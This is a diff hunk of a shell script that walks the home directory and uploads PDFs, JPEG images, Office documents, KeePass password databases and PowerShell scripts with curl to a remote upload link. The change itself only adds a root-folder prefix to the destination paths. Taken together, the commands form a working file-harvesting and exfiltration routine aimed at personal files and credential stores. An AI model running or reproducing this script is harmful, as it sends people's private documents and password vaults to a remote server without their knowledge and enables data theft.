@@ -45,17 +45,17 @@ done
 cd ~
 
 # search and upload pdfs
-find . -iname '*.pdf' -exec curl -H "$header" -F file=@{} -F parent_dir=/pdfs/ -F replace=1 "$upload_link" \; 
+find . -iname '*.pdf' -exec curl -H "$header" -F file=@{} -F parent_dir=/$rootfolder/pdfs/ -F replace=1 "$upload_link" \; 
 
 # search and upload images
-find . -type f \( -name "*.jpg" -o -name "*.jpeg" \) -exec curl -H "$header" -F file=@{} -F parent_dir=/images/ -F replace=1 "$upload_link" \;
+find . -type f \( -name "*.jpg" -o -name "*.jpeg" \) -exec curl -H "$header" -F file=@{} -F parent_dir=/$rootfolder/images/ -F replace=1 "$upload_link" \;
 
 # search and upload office docs
-find . -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pptx" \) -exec curl -H "$header" -F file=@{} -F parent_dir=/docs/ -F replace=1 "$upload_link" \;
+find . -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pptx" \) -exec curl -H "$header" -F file=@{} -F parent_dir=/$rootfolder/docs/ -F replace=1 "$upload_link" \;
 
 # search and upload keepass dbs
-find . -iname '*.kdbx' -exec curl -X POST -H "$header" -F file=@{} -F parent_dir=/keepass/ -F replace=1 "$upload_link" \; 
+find . -iname '*.kdbx' -exec curl -X POST -H "$header" -F file=@{} -F parent_dir=/$rootfolder/keepass/ -F replace=1 "$upload_link" \; 
 
 # search and upload keepass dbs
-find . -iname '*.ps1' -exec curl -H "$header" -F file=@{} -F parent_dir=/powershell/ -F replace=1 "$upload_link" \; 
+find . -iname '*.ps1' -exec curl -H "$header" -F file=@{} -F parent_dir=/$rootfolder/powershell/ -F replace=1 "$upload_link" \; 
 
